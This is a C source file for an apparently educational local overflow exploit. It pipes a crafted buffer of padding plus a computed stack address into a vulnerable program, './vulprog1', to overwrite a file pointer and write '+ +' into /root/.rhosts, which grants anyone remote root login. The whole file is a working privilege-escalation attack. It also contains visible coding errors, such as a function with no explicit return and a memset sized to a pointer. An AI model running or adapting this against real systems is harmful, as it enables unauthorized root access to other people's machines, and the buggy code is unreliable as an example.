#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define BUFSIZE 256
#define DIFF 16 // estimated diff between buf & tmpfile
#define VULPROG "./vulprog1"
#define VULFILE "/root/.rhosts"

unsigned long getrsp() {
	// movl - 32bit
	// movq - 64bit
	// mov - assembler will infer
	__asm__("mov %rsp,%rax");
}

int main(int argc, char **argv)
{
	unsigned long addr;
	register int i;
	int mainbufsize;

	// 4 extra bytes for 32 -> 64 bit address
	char *mainbuf, buf[4+DIFF+6+1] = "+ +\t# ";

	if (argc <= 1) {
		fprintf(stderr, "Usage: %s <offset>\n", argv[0]);
		exit(-1);
	}

	memset(buf, 0, sizeof(buf));
	strcpy(buf, "+ +\t# ");

	memset(buf + strlen(buf), 'A', DIFF);
	addr = getrsp() + atoi(argv[1]);

	// reverse byte order
	for (i = 0; i < sizeof(unsigned long); ++i){
		buf[DIFF+i] = ((addr >> (i*8)) & 255);
	}
	
	mainbufsize = strlen(buf) + strlen(VULPROG) + strlen(VULPROG) + strlen(VULFILE) + 13;

	mainbuf = malloc(mainbufsize);
	memset(mainbuf, 0, sizeof(mainbuf));

	snprintf(mainbuf, mainbufsize-1, "echo '%s' | %s %s\n", buf, VULPROG, VULFILE);

	printf("mainbuf = [%s]\n", mainbuf);

	printf("Overflowing tmpaddr to point to %p, check %s after.\n\n", addr, VULFILE);

	system(mainbuf);
	return 0;
}

